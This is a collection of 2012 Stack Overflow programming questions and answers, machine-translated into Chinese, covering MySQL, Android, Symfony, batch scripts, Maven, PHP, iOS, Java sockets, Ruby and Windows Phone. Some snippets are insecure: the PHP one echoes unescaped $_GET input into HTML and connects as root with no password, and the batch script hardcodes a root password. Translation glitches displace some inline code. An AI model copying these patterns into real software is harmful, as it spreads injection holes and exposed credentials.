大多数面向搜索引擎的网站都使用`FULL-TEXT-SEARCH`. `select`与...相比，它会更快`LIKE`...我添加了一个示例和一些链接...我认为这对您很有用...在此全文搜索中也有一些条件...

**第1步**

```
CREATE TABLE articles (
    id INT UNSIGNED AUTO_INCREMENT NOT NULL PRIMARY KEY,
    title VARCHAR(200),
    body TEXT,
    FULLTEXT (title,body)
); 
```

**第2步**

```
INSERT INTO articles (title,body) VALUES
    ('MySQL Tutorial','DBMS stands for DataBase ...'),
    ('How To Use MySQL Well','After you went through a ...'),
    ('Optimizing MySQL','In this tutorial we will show ...'),
    ('1001 MySQL Tricks','1\. Never run mysqld as root. 2\. ...'),
    ('MySQL vs. YourSQL','In the following database comparison ...'),
    ('MySQL Security','When configured properly, MySQL ...'); 
```

**STEP:3**
*自然语言全文搜索：*

```
SELECT * FROM articles
    WHERE MATCH (title,body) AGAINST ('database'); 
```

*布尔全文搜索*

```
SELECT * FROM articles WHERE MATCH (title,body)
     AGAINST ('+MySQL -YourSQL' IN BOOLEAN MODE); 
```

浏览此链接 [viralpatel.net](http://viralpatel.net/blogs/full-text-search-using-mysql-full-text-search-capabilities/)、[devzone.zend.com](http://devzone.zend.com/26/using-mysql-full-text-searching/)、[sqlmag.com](http://www.sqlmag.com/article/sql-server-70/sample-full-text-search-engine-8967)、[colorado.edu](http://www.colorado.edu/conflict/peace/usip_exmpl_srch.html)、[en.wikipedia.org](http://en.wikipedia.org/wiki/Full_text_search)

# mysql - 更改 MySql 表会导致键约束失败

> ID：10514408
> 
> 赞同：0
> 
> 时间：2012-05-09T10:40:06.247
> 
> 标签：mysql, foreign-keys, mysql-workbench

我正在尝试`table1`使用此查询将外键添加到 my 。

```
 ALTER TABLE `db`.`table1` 
  ADD CONSTRAINT `fk_table1_2`
  FOREIGN KEY (`field1` )
  REFERENCES `db`.`table2` (`id` )
  ON DELETE NO ACTION
  ON UPDATE NO ACTION; 
```

`table1.field1`应该指的是`table2.id`，两者都是`INT(11)`。

它失败并出现此错误：

```
ERROR 1452 (23000): Cannot add or update a child row: a foreign key constraint fails (`db`.<result 2 when explaining filename '#sql-3f9_4c'>, CONSTRAINT `fk_table1_2` FOREIGN KEY (`field1`) REFERENCES `table2` (`id`) ON DELETE NO ACTION ON UPDATE NO ACTION) 
```

在 Workbench 中尝试会出现上一个错误，另一个错误是`ERROR 1050: Table 'table1' already exists`显示`CREATE TABLE`查询，就好像它正在尝试“重新创建”表一样！

它出什么问题了？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:52:16.873

[MySQL FK Doc](http://dev.mysql.com/doc/refman/5.5/en/innodb-foreign-key-constraints.html)`Cannot add or update a child row: a foreign key constraint fails`中引用了该错误 ( )

要在 2 个表之间添加引用，条件必须适合现有数据。

这意味着如果你说then的`table1.id = table2.id`所有 id必须匹配在一起。`table1``table2`

要解决这个问题，您必须消除或修复那些不匹配的行。
例子：

```
table1.id  |  table2.fk
   1       |       1      ok 
   2       |     null     error
   3       |       4      error if id 4 is not in table1 
```

# android - 什么时候在android中加载活动的布局？

> ID：10514414
> 
> 赞同：0
> 
> 时间：2012-05-09T10:40:12.297
> 
> 标签：android, android-layout

这是我的活动（片段）：

```
setContentView(R.layout.main)
//Some Time consuming code 
```

如您所见，耗时的代码放在`setcontentview`. 此活动需要很长时间才能加载。确认我删除了耗时的代码并且活动显示非常快。我的问题是我只是在`setContentView`布局之后才做耗时的工作，那么为什么至少要显示布局需要这么多时间。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T10:44:07.743

该应用程序在单线程 UI 线程上运行。在完成其他所有操作之前，它无法显示视图。

您需要`AsyncTask`为任何耗时的代码使用一个或一个线程。看看这个：http: [//developer.android.com/resources/articles/painless-threading.html](http://developer.android.com/resources/articles/painless-threading.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T10:46:27.493

每个耗时的任务都应该在非 UI 线程中完成。考虑使用 AsyncTask。要回答您的问题，只有在整个 onCreate 方法完成后才会显示活动。所以它设置它的内容视图，然后它执行 onCreate 方法的其余部分（你的耗时代码）然后它显示。

供您参考，这里是 AsyncTask 的文档：http: [//developer.android.com/reference/android/os/AsyncTask.html](http://developer.android.com/reference/android/os/AsyncTask.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-09T10:47:33.577

您应该在 onResume() 方法中完成所有耗时的工作。那么完成 onCreate() 方法可能需要更少的时间，并且您的布局将加载得更快。

# php - Symfony2 返回类在实体加载时不存在

> ID：10514415
> 
> 赞同：0
> 
> 时间：2012-05-09T10:40:14.703
> 
> 标签：php, symfony, doctrine-orm

我正在尝试从我的文件实体加载一个对象，但 symfony 不断返回“Class Frontend\FolderBundle\Entity\Role 不存在”，但我可以从子文件夹实体中使用它而不会出现任何问题或警告

我有以下实体：

```
Frontend\FolderBundle\Entity\File:
type: entity
table: file
fields:
id:
  type: integer
  id: true
  generator:
    strategy: AUTO
filename:
  type: text
user:
  type: integer
manyToOne:
folder:
    targetEntity: Frontend\FolderBundle\Entity\Subfolder
    inversedBy: files
    joinColumn:
      name: subfolder_id
      referencedColumnName: id
lifecycleCallbacks: {  }

Frontend\FolderBundle\Entity\Subfolder:
type: entity
table: subfolder
fields:
id:
  type: integer
  id: true
  generator:
    strategy: AUTO
name:
  type: string
  length: 255
manyToOne:
    folder:
        targetEntity: Folder
        inversedBy: subfolder
        joinColumn:
            name: folder_id
            referencedColumnName: id
oneToMany:
    files:
        targetEntity: File
        mappedBy: folder
manyToMany:
roles:
  targetEntity: Frontend\UserBundle\Entity\Role
  inversedBy: subfolders
  joinTable:
    name: folder_rights
    joinColumns:
      subfolder_id:
        referencedColumnName: id
    inverseJoinColumns:
      role_id:
        referencedColumnName: id
lifecycleCallbacks: {  } 
```

从子文件夹中获取角色的文件夹工作正常。

我已经清除了应用程序/缓存和教义缓存，但这并不能解决问题..

如果您需要更多信息/代码片段，请询问，我会提供。

提前致谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-10T07:14:18.063

错误出现在 Subfolder.php 实体中。有一个 addRole 函数引用了具有正确实体的错误包。

# batch-file - 将两个字符串“当前工作目录”和“app.exe”文件名连接到框架绝对路径

> ID：10514424
> 
> 赞同：2
> 
> 时间：2012-05-09T10:40:39.973
> 
> 标签：batch-file, string-concatenation

我有一个类似这样的目录结构：

在下面`'D:\Ashwin\rev'`

```
rev
-->dist
---->app.exe
-->copier
---->cs
------>cs.bat
------>pscp.exe
-->Copy.bat 
```

内容`Copy.bat`为：

```
@echo "Starting copy"
@call "copier\cs\cs.bat" 
```

并且内容`cs.bat`还不完整。

```
%BINARY% = DIR /b dist\*%.exe
%ASH% = %CD%%1\dist\%BINARY% 

@call copier\cs\pscp -l root -pw ReDBuLL <What to do?> 192.168.1.16:/root/workspace 
```

这就是为什么。我对批处理脚本完全陌生。[此脚本的目的是使用pscp](http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html) 工具将 .exe 文件单独发送到远程服务器。

我被困在连接两个字符串。

1.  `BINARY`其中有`app.exe`名字。
2.  `ASH`这是当前工作路径的串联字符串和`BINARY`

有了这个串联的刺，我计划将它传递给`pscp`命令并将文件传输到远程服务器。

我应该只`Copy.bat`用来复制文件而不是`cs.bat`

这里还缺少什么？

PS：我本可以对路径进行硬编码，但这不是我想要做的。因为 app.exe 不会是目录中的唯一文件，因为我将添加其他几个文件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T12:03:54.913

我假设您的代码来自 linux 脚本，但在 Windows 世界中，这不起作用。
不要使用空格来格式化你的代码（比如 in `%BINARY% = DIR /b dist\*%.exe`），它会改变行为！
二进制和 ASH 未设置为命令的输出，内容是命令。

要获得命令的输出，您通常使用`FOR/F-Loop`构造。

`for /f "delims=" %%A in ('DIR /b dist\*.exe') DO set "binary=%%A"`

所以你的代码更喜欢这样

```
@echo off
for /f "delims=" %%A in ('DIR /b dist\*.exe') Do set "binary=%%A"
set "ASH=%CD%\dist\%BINARY%"

set "PastedString=%ASH%\%BINARY%"
echo The content of PastedString is %PastedString%
call copier\cs\pscp -l root -pw ReDBuLL "%PastedString%" 192.168.1.16:/root/workspace 
```

# maven - 使用 Maven 配置文件进行工件版本控制

> ID：10514425
> 
> 赞同：4
> 
> 时间：2012-05-09T10:40:41.910
> 
> 标签：maven, build, versioning, profile, artifactory

我希望项目的版本号为正常发布版本控制的以下格式：

```
<version>1.0-SNAPSHOT</version>
<version>1.0.1-SNAPSHOT</version>
...... 
```

另一方面，我希望为每个合并的更改创建一个内置工件，如下所示：

```
<version>1.0-SNAPSHOT-${timestamp}</version> 
```

我可以通过使用 Maven 配置文件来实现这一点吗？就像是：

```
<profiles>
    <profile>
        <id>normal</id>
        <version>1.0-SNAPSHOT<version>
    </proifle>
    <profile>
        <id>build</id>
        <version>1.0-SNAPSHOT-${timestamp}<version>
    </proifle>
</profiles> 
```

这样我就可以像这样构建它：

```
mvn package -P normal  // this gives me artifact-1.0-SNAPSHOT.jar
or
mvn package -P build     // this gives me artifact-1.0-SNAPSHOT-${timestamp}.jar 
```

如果配置文件可以解决这个问题，还有哪些其他方法？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-09T10:55:12.707

虽然我不推荐这种方法，但您可以使用配置文件来完成此任务。这是如何完成的：

```
<version>${projectVersion}</version>
...
<profiles>
    <profile>
        <id>normal</id>
        <activation>
            <activeByDefault>true</activeByDefault>
        </activation>
        <properties>
            <projectVersion>1.0-SNAPSHOT</projectVersion>
        </properties>
    </profile>
    <profile>
        <id>build</id>
        <properties>
            <projectVersion>1.0-SNAPSHOT-${timestamp}</projectVersion>
        </properties>
    </profile>
</profiles> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T11:20:29.567

使用[Builder Number 插件](http://mojo.codehaus.org/buildnumber-maven-plugin/usage.html)和/或评估内置的[时间戳属性](http://maven.apache.org/guides/introduction/introduction-to-the-pom.html#Available_Variables)。**无论如何，不**​​建议使用您的方法，因为 SNAPSHOT 必须始终是最新的。

# php - 如何使用带有“？和＆”的php $_GET将两个以上的值从一种形式（从mysql获取值）发送到另一个？

> ID：10514428
> 
> 赞同：0
> 
> 时间：2012-05-09T10:40:54.810
> 
> 标签：php

我想使用 PHP 从 MYsql 中检索三个值，并使用 $_Get 函数将这三个值发送到其他表单，我正在获取前两个输入的值（至少在我所需的文本框之外）。我无法获得第三个值（P_age）

```
 // in form where I retrieve values from Database and send it to other using "?" and "&"

          $connection=mysql_connect("localhost", "root","");
          mysql_select_db("Aravind_Database",$connection);
          $v= mysql_query("Select * from patient_details order by P_id");
          while ($row = mysql_fetch_array($v))
          {           
          echo $row['P_id'];      
          echo "<tr><td>".$row['P_id']."</td><td>".$row['P_name']."</td><td>".$row['P_age']."</td><td>"."<a href=Editing_Patient_Detail.php>Edit</a></td><td><a href=Delete_Patient_Detail.php?P_id=".$row['P_id']."&P_name=".$row['P_name']."&P_age=".$row['P_age'].">Delete</a>";
          }
          mysql_close( $connection);

// form where I try to retrieve values through $_Get

    $connection=mysql_connect("localhost", "root","");
               mysql_select_db("Aravind_Database",$connection);
               if ($_GET['P_id']!= '')
              {     
                            $v= mysql_query(" Select * from patient_details order by P_id");
                            while ($row = mysql_fetch_array($v))
                            {   
                                  if ($row['P_id'] == $_GET['P_id'])
                                  {
                                   ?> <input type="text" value='<?php echo $_GET['P_id'] ?>' disabled="true" /><br>
 <input type="text" width="145" value='<?php  echo $_GET['P_name'] ?>' disabled="true" /><br>
 <input type="text" value   ='<?php  echo $_GET['P_age']?>' disabled="true" /><br>
 <?php 
                                   break;
                                  }
                            }
                            mysql_close($connection);
              } 

    enter code here 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:43:48.547

我会包括

```
name="myinput_name" 
```

在输入标签中以及禁用时为真... GET 和 POST 忽略它...我认为您应该将其设为 readonly="readonly" 而不是 disabled

# iphone - 访问 iVars 并在后台创建 UIImage？

> ID：10514430
> 
> 赞同：0
> 
> 时间：2012-05-09T10:40:58.970
> 
> 标签：iphone, objective-c, cocoa-touch

我希望使用`performSelectorInBackground:withObject:`我有两个问题预加载一些图像...

1.  我知道你不应该在后台做任何与 UIKit 相关的事情，但我可以实例化 UIImage 对象并将它们添加到可变数组中。

2.  是否可以从在后台线程上运行的选择器中安全地访问调用对象中的 iVars（上面的可变数组）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:47:44.327

是的，您可以将图像创建/加载到可变数组和第二部分的数组中，您还可以在后台线程中访问类的 ivars，如果这不是 UIKit 的数据（如 imageview 等），则不需要使用主线程，但如果它是，你可以使用

```
[self performSelectorOnMainThread:@selector(loadPersonView) withObject:imageArray waitUntilDone:YES]; 
```

# java - Java：客户端，客户端，（线程）服务器，流客户端信息，JPanel 创建但消息（？）阻止游戏开始

> ID：10514431
> 
> 赞同：0
> 
> 时间：2012-05-09T10:41:13.400
> 
> 标签：java, multithreading, stream, jpanel

我正在开发一个小规模的`client1/ client2, server (threaded) TCP game`。在尝试处理延迟问题时，我意识到我的`transmitState()`. 它迫使不必要的信息在通信流中产生迟缓，将汽车留在 JPanel 的不同位置，基本上是错误的。所以我把它拿出来了。

但是在这样做的过程中，我产生了一些问题，尽管所有的通信、协议、线程、“信使”和一切都在工作，但在我的逻辑中，我已经通过不允许`repaint()`,`transmitState()`并`receiveState()`完成他们的工作而停止了游戏的开始逻辑顺序。

我真的看不出我哪里出错了。有什么建议么？

注意： case 语句测试的`if`条件`keyPressed`是让精灵在左右旋转 360 度等，而 vel 是速度，所以不能超过 100。`carRem`=汽车远程客户端。我知道有很多代码，但过去我（正确地）被告知没有包含足够的代码，所以我认为所有这些都显示了需要显示的内容（如果我错了请告诉我:)） .

**传输状态：**

```
public void transmitState(String s)
    {
        try
        {
            outputStream.writeBytes(s + "\n");
        }
        catch(IOException e)
        {
            System.err.println(e);
        }
    } 
```

**接收状态：**

```
 public void receiveState()
    {
        try
        {
            messageIn = inputStream.readLine();
        }
        catch(IOException e)
        {
            System.err.println(e);
        }
        testState(messageIn);
    } 
```

**测试状态：**

```
public void testState(String s)
{
if (s.equals("l") || s.equals("r") || s.equals("u") || s.equals("d"))
{
  c = s.charAt(0);
  this.i2 = i2;
  this.vel2 = vel2;
  this.carRem = carRem;

  switch (c)
  {
    case 'l':
      if (i2 == 0)
      {
        i2 = 15;
      }
      else
      {
        i2--;
      }
      carRem.setCurrentImage(i2);
      break;
    case 'r':
      if (i2 == 15)
      {
        i2 = 0;
      }
      else
      {
        i2++;
      }
      carRem.setCurrentImage(i2);
      break;
    case 'u':
      if (vel2 == 100)
      {

      }
      else
      {
        vel2 = vel2 + 10;
        carRem.setVel(vel2);
      }
      break;
    case 'd':
      if (vel2 == 0)
      {

      }
      else
      {
        vel2 = vel2 - 10;
        carRem.setVel(vel2);
      }
      break;
  }
}
} 
```

JPANEL（具有大多数客户端功能）：

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;

public class UIPanel extends JPanel implements ActionListener, KeyListener
{       
    //sprite creation stuff, works fine (excluded here)
    private Timer timer;
    private CarLocal carLoc;
    private CarRemote carRem;
    private String carLocColour;

    private ClientMessenger cliMess = null;

    public UIPanel(CarLocal carLoc, CarRemote carRem, ClientMessenger cliMess)
    {
        this.carLoc = carLoc;
        this.carRem = carRem;
        this.cliMess = cliMess;

        images1 = new ImageIcon[TOTAL_IMAGES];
        images2 = new ImageIcon[TOTAL_IMAGES];

        carLocColour = carLoc.getColour();
            //setting sprites and testing order  (works fine and excluded here)

        this.addKeyListener(this);
        this.setFocusable(true);

       timer = new Timer(80, this);
        timer.start();
    }

    public void keyTyped(KeyEvent e) 
    {

    }

   public void keyPressed(KeyEvent e) 
    {
        int i1 = carLoc.getCurrentImage();
        int i2 = carRem.getCurrentImage();
        int vel1 = carLoc.getVel();
        int vel2 = carRem.getVel();
        switch (e.getKeyCode()) 
        {
        case KeyEvent.VK_LEFT:
                if(i1 == 0)
                {
                    i1 = 15;
                }
                else
                {
                    i1--;
                }
                carLoc.setCurrentImage(i1);
                cliMess.transmitState("l");
                break;
            case KeyEvent.VK_RIGHT:
                if(i1 == 15)
                {
                    i1 = 0;
                }
                else
                {
                    i1++;
                }
                carLoc.setCurrentImage(i1);
                cliMess.transmitState("r");
                break;
        case KeyEvent.VK_UP:
                if(vel1 == 100)
                {

                }
                else
                {
                    vel1 = vel1 + 10;
                    carLoc.setVel(vel1);
                    cliMess.transmitState("u");
                }
                break;
        case KeyEvent.VK_DOWN:
                if(vel1 == 0)
                {

                }
                else
                {
                    vel1 = vel1 - 10;
                    carLoc.setVel(vel1);
                    cliMess.transmitState("d");
                }
                break;
        }

        carLoc.setCurrentImage(i1);
        carLoc.setVel(vel1);;
   }

   public void keyReleased(KeyEvent e) 
    {

   }

    public void actionPerformed(ActionEvent e)
    {
        repaint();
        cliMess.receiveState();
    }

    public void paintComponent(Graphics g)
    {
        for(int iVel1 = carLoc.getVel(); iVel1 > 0; iVel1 = iVel1 - 10)
        {
            carLoc.forwardCalc(); 
        }
        for(int iVel2 = carRem.getVel(); iVel2 > 0; iVel2 = iVel2 - 10)
        {
            carRem.forwardCalc();
        }

        super.paintComponent(g);
        int i1X = carLoc.getCarX();
        int i1Y = carLoc.getCarY();
        int i2X = carRem.getCarX();
        int i2Y = carRem.getCarY();
        int currentImage1 = carLoc.getCurrentImage();
        int currentImage2 = carRem.getCurrentImage();
        Color c0 = Color.black;
        //includes some graphics stuff, works fine, excluded here

        images1[currentImage1].paintIcon( this, g, i1X, i1Y);
        images2[currentImage2].paintIcon( this, g, i2X, i2Y);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:52:22.287

根据您计划发送的数据量，您可能需要调用[flush()](http://docs.oracle.com/javase/6/docs/api/java/io/OutputStream.html#flush%28%29)以确保发送数据而不需要内部缓冲区已满。

# ruby - 在字符串中查找键并仅显示键字符之后的部分

> ID：10514432
> 
> 赞同：-1
> 
> 时间：2012-05-09T10:41:14.043
> 
> 标签：ruby, string, if-statement, wikipedia

我有一个包含很多文本的字符串，它是一个维基百科字符串，我真的不想要它的全部，只是一部分。

我遇到的问题是字符串的第一部分。它有时看起来像这样。

```
{{olika betydelser}} {{Ortsfakta Sverige | ortnamn = Höganäs | form = [[Tätort]]<br>[[Centralort]] | slogan = | smeknamn = | bild = | bildtext = | vapen = | landskap = [[Skåne]] | län = [[Skåne län]] | kommun = [[Höganäs kommun]] | församling = [[Höganäs församling]] | koordinat = | höjdläge = | lat_g = 56 | lat_m = 12 | lat_s = | lat_NS = N | long_g = 12 | long_m = 34 | long_s = | long_EW = E | areaort = {{Stat/Sverige/Tätorter/Areal| 3488 }} | invort = {{Stat/Sverige/Tätorter/Befolkning| 3488 }} | invår = {{Stat/Sverige/Tätorter/Befolkning| år }} | täthet = auto | grundades = | postort = HÖGANÄS | postnummer = 263 XX | riktnummer = 042 | tätortskod = 3488 | positionskarta = Skåne | positionskartnamn = Sweden Scania location map.svg | karttext = | prickpos x = 32 | prickpos y = 105 | fotnot = | invnot = {{Stat/Sverige/Tätorter/Befolkning| ref }} }}<!-- Slut på Mall:Ortsfakta Sverige --> 
```

在这些情况下，我想排除上半部分，但取下面的部分。

```
[[Fil:Hoganas_hamn.jpg|miniatyr|Höganäs Hamn.]] [[Fil:Hoganas_hamn_kvickbadet.jpg|miniatyr|Höganäs Hamn - Kvickbadet.]] [[Fil:Höganäs Jefast ny redigerad-1.jpg|miniatyr|Jefasthuset sett från väster med en del av den nya bryggan vid Kvickbadet.]] '''Höganäs''' är en [[tätort]] och [[centralort]] i [[Höganäs kommun]] i [[Skåne län]]. Höganäs blev stad 1936\. Ursprungligen är Höganäs ett [[fiskeläge]] kring vilket en [[gruvindustri]] utvecklades för brytning av [[kol (bränsle)|kol]] och [[lera|leror]] för tillverkning av [[eldfast]] [[keramik]] ([[Höganäskrus]]). Gruvindustrin är numera nedlagd. == Historia == Fiskeläget Höyenaess (Höganäs) finns omnämnd första gången 1488\. Från 1569 och århundradena framåt bestod det av 20 hushåll, något färre under peståren på 1700-talet. [[Höganäs AB|Höganäsbolaget]] grundades 1797, då gruvverksamheten tog fart. Denna gruvverksamhet fanns kvar i bygden fram tills mitten av 1960-talet. Efter att tidigare ha ingått i [[Väsby socken]] bildade Höganäs på 1850-talet en självständig församling.... 
```

我在想的是写一个方法来检查是否

```
if <!-- Mall: xxx --> 
```

其中 xxx 是动态存在的，在这种情况下排除第一部分。

我正在使用 gem [Wikipedia-client](https://github.com/kenpratt/wikipedia-client)来接收维基百科信息。

我很新手，不是在寻找一个完整的解决方案，而是从哪里开始的提示。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:57:09.530

您对所需内容的描述非常模糊，并且没有显示任何代码，但这有帮助吗？

```
s =~ /Mall:(.*)\s+-->/ && puts($1)
# prints "Ortsfakta Sverige" 
```

更长的版本：

```
if s =~ /Mall:(.*)\s+-->/
  puts $1
end 
```

或者，如果您不喜欢 Perlish `=~`：

```
if m = s.match(/Mall:(.*)\s+-->/)
  puts m[1]
end
# also prints "Ortsfakta Sverige" 
```

# c# - RichTextBox 不显示我的所有文本。

> ID：10514434
> 
> 赞同：3
> 
> 时间：2012-05-09T10:41:20.237
> 
> 标签：richtextbox, c#, silverlight, windows-phone-7, silverlight-4.0

在我的 Windows Phone 应用程序中，我使用的是[richtextbox](/questions/tagged/richtextbox "显示标记为“richtextbox”的问题")

```
 <ScrollViewer Margin="0,0,0,0"  VerticalAlignment="Top">
        <StackPanel Margin="0,0,0,0" Width="Auto"  >
            <RichTextBox x:Name="Browser" Foreground="Black" Height="Auto" cxi:WebBrowserHelper.Html="{Binding BrowserHtml}" Background="Transparent" HorizontalAlignment="Left" VerticalAlignment="Top"  Width="460" Margin="0,0,0,0" AcceptsReturn="True" VerticalScrollBarVisibility="Visible" />
        </StackPanel>
    </ScrollViewer> 
```

但并非所有文本都显示。我该如何解决这个问题？

![在此处输入图像描述](../Images/fdc6cf86dd79e084632e1771afc5aef7.png) ![在此处输入图像描述](../Images/2a6b53ccc7feb2b828c52b7dd54cc6e5.png)

**更新1**

在我输入高度 = 700 之后：（见第二张图片）

**更新2**

```
 <StackPanel Margin="0,0,0,0" Width="480" Orientation="Vertical">
        <ScrollViewer Margin="0,0,0,0"  VerticalAlignment="Top" Height="1000" >
            <StackPanel Margin="0,0,0,0" Width="Auto"  >
                <RichTextBox x:Name="Browser" Foreground="Black" Height="1000" cxi:WebBrowserHelper.Html="{Binding BrowserHtml}" Background="Transparent" HorizontalAlignment="Left"   Width="460" Margin="0,0,0,0" AcceptsReturn="True" VerticalScrollBarVisibility="Visible" />
            </StackPanel>
        </ScrollViewer>
    </StackPanel> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T13:06:16.303

问题不是 RichTextBox，它是由您使用 StackPanels 引起的。*下面的示例使用简单的矩形重现问题/解决方案。*

垂直方向的 StackPanel 扩展到内容的大小。这意味着其中的 ScrollViewer 无法正确拉伸以适应。要使 ScrollViewer 工作，它必须是固定大小。

## 出于同样的原因，这个简单的示例不起作用：

```
 <Grid x:Name="ContentPanel" Grid.Row="1" Margin="12,0,12,0">
        <StackPanel Margin="0,0,0,0" Width="480" Orientation="Vertical">
            <ScrollViewer Margin="0,0,0,0"  VerticalAlignment="Stretch">
                  <StackPanel Margin="0,0,0,0" Width="Auto"  >
                       <Rectangle Fill="Aqua" Height="200"/>
                       <Rectangle Fill="Red" Height="200"/>
                       <Rectangle Fill="Yellow" Height="200"/>
                       <Rectangle Fill="Blue" Height="200"/>
                       <Rectangle Fill="Green" Height="200"/>
                  </StackPanel>
             </ScrollViewer>
         </StackPanel>
    </Grid> 
```

## 这有效（ScrollViewer 外没有堆栈面板）：

```
 <Grid x:Name="ContentPanel" Grid.Row="1" Margin="12,0,12,0">
        <ScrollViewer Margin="0,0,0,0"  VerticalAlignment="Stretch" >
             <StackPanel Margin="0,0,0,0" Width="Auto"  >
                  <Rectangle Fill="Aqua" Height="200"/>
                  <Rectangle Fill="Red" Height="200"/>
                  <Rectangle Fill="Yellow" Height="200"/>
                  <Rectangle Fill="Blue" Height="200"/>
                  <Rectangle Fill="Green" Height="200"/>
             </StackPanel>
         </ScrollViewer>
    </Grid> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-01T07:09:41.377

您必须在 RichTextBox 中设置 height="auto"。以下代码适用于我：

```
 <Grid x:Name="ContentPanel" Grid.Row="1" Margin="12,0,12,0">
            <ScrollViewer Margin="0,0,0,0"  VerticalAlignment="Stretch" >
            <RichTextBox ScrollViewer.VerticalScrollBarVisibility="Visible"  Name="richTextBox" Style="{StaticResource RichTextBoxStyle1}" Height="auto"/>
            </ScrollViewer>
        </Grid> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T13:03:38.123

使用 ScrollViewer 时，您必须指定它的高度元素（固定或动态，如网格）。否则它会根据内容占用所有高度，即使它超出了屏幕。所以试试这样的 'ScrollViewer Height="700"....'

# objective-c - 如何正确初始化、使用和保存 UIManagedDocument

> ID：10514437
> 
> 赞同：0
> 
> 时间：2012-05-09T10:41:39.837
> 
> 标签：objective-c, ios, core-data, uimanageddocument

我正在处理使用 UIManagedDocument 让我的应用程序工作。几天前我发布了另一个问题，但我还没有得到它的工作。让我们看看我能不能做得更好。
我的应用程序需要从 plist 文件中加载一些数据并用它填充数据库。然后，有些参数会不时更改，我还需要在数据库中加载和更新它们。
应用程序应遵循以下顺序：创建/打开数据库、加载数据、更新变量数据。
我的问题是在尝试正确遵循该顺序时出现的，主要是因为我无法在数据库中创建所有对象之前更新变量数据（因此必须更新 nil 变量），而我的解决方法只会导致我出乎意料崩溃和不合逻辑的行为。
这里'

在视图代码中：

```
- (void)viewDidLoad{
    [super viewDidLoad];
    self.database = [DataHelper opendatabaseAndUseBlock:^{
        [self setupFetchedResultsController]; // I pass this method trough a Block because I want it
                                              // to be executed once the database is opened, not before.
    }];
} 
```

然后我使用这个助手类“DataHelper”，它包含以下代码：

```
@implementation DataHelper

// This method creates and opens the database, then calls the necessary methods
+ (UIManagedDocument *)openDatabaseAndUseBlock:(completion_block_t)completionBlock
{

    NSURL *url = [[[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] lastObject];
    url = [url URLByAppendingPathComponent:@"Database"];
    UIManagedDocument *database = [[UIManagedDocument alloc] initWithFileURL:url];

    if (![[NSFileManager defaultManager] fileExistsAtPath:[database.fileURL path]]) {
        [database saveToURL:database.fileURL forSaveOperation:UIDocumentSaveForCreating completionHandler:^(BOOL success) {
            [self loadDataIntodatabase:database withSuccess:success];
            completionBlock();
        }];

    } else if (database.documentState == UIDocumentStateClosed) {
        [database openWithCompletionHandler:^(BOOL success) {
            [self loadDataIntodatabase:database withSuccess:success];
            completionBlock();
        }];

    } else if (database.documentState == UIDocumentStateNormal) {
        [self loadDataIntodatabase:database withSuccess:YES];
        completionBlock();
    }

    return database;
}

// This method loads the "static" data into the database, by reading it from a plist file.
// Once the loading finishes, it should call the last method, for updating the variable data
+ (void)loadDataIntoDatabase:(UIManagedDocument *)database withSuccess:(BOOL)success
{
    if (success) {        
        NSString *path = [[NSBundle mainBundle] pathForResource:@"Data" ofType:@"plist"];
        NSArray *plistData = [NSArray arrayWithContentsOfFile:path];

        [database.managedObjectContext performBlock:^{
            for (NSDictionary *data in plistData) {
                [Object createObjectWithData:data inManagedObjectContext:database.managedObjectContext];
            }

            // Not sure what to do here!!
            //[database saveToURL:database.fileURL forSaveOperation:UIDocumentSaveForOverwriting completionHandler:^(BOOL success) {
                 // [DataHelper updateVariableDataOfDatabase:database];
            //}];

            // Or...?
            //[database updateChangeCount:UIDocumentChangeDone];             
            // [DataHelper updateVariableDataOfDatabase:database];

        }];

    } else {
        NSLog(@"NO SUCCESS");
    }
}

// This last method updates some parameters of the existing data
// in the database, to the ones found in another plist file
+ (void)updateVariableDataOfDatabase:(UIManagedDocument *)database
{
    // This path is provisional, should be gotten from an online resource
    NSString *path = [[NSBundle mainBundle] pathForResource:@"VariableData" ofType:@"plist"];
    NSDictionary *variables = [NSDictionary dictionaryWithContentsOfFile:path];

    [database.managedObjectContext performBlock:^{
        // Update the objects changing the values of the variable parameters
        // to the ones found in "variables"

        // Now I should save the changes, or maybe not?
        //[database saveToURL:database.fileURL forSaveOperation:UIDocumentSaveForOverwriting completionHandler:nil];
        // Or...
        //[database updateChangeCount:UIDocumentChangeDone];

    }];
}
@end 
```

如果我使用“saveToURL”方法，虽然它看起来不正确，但它会正确执行加载顺序，因为在所有数据都加载到数据库之前不会执行最后一个方法。但是，当尝试执行许多操作时，应用程序会随机崩溃（内部有很多节省，例如删除、更新或重新加载）。
另一方面，通过使用“updateChangeCount”，应用程序不再崩溃，但序列不能正常工作：变量数据没有更新，应用程序找不到存在的对象，on数据库等等。如果我在每个动作之间等待 2 分钟左右，那么是的，它有效……但这不是我想要的。

我真的很感谢这里的一些帮助，这很浪费我的时间，而且这个项目的截止日期已经很近
了 :( 非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-13T18:06:15.673

一段时间过去了，希望您已经在这里解决了您的问题，但以防万一我自己在过去几个月里一直在解决一堆与 UIManagedDocument 相关的问题，所以我能感受到您的痛苦。你在这里所做的与我在最近的一个项目中需要做的非常相似。

不幸的是，关于如何保存（或不保存）一般的 UIManagedDocument 的文档和各种建议似乎到处都是。我使用 saveToURL 和 updateChangeCount 方法发现了类似的结果，但是 updateChangeCount 方法似乎不太频繁地导致保存错误。但我认为这不会真正影响您的问题。

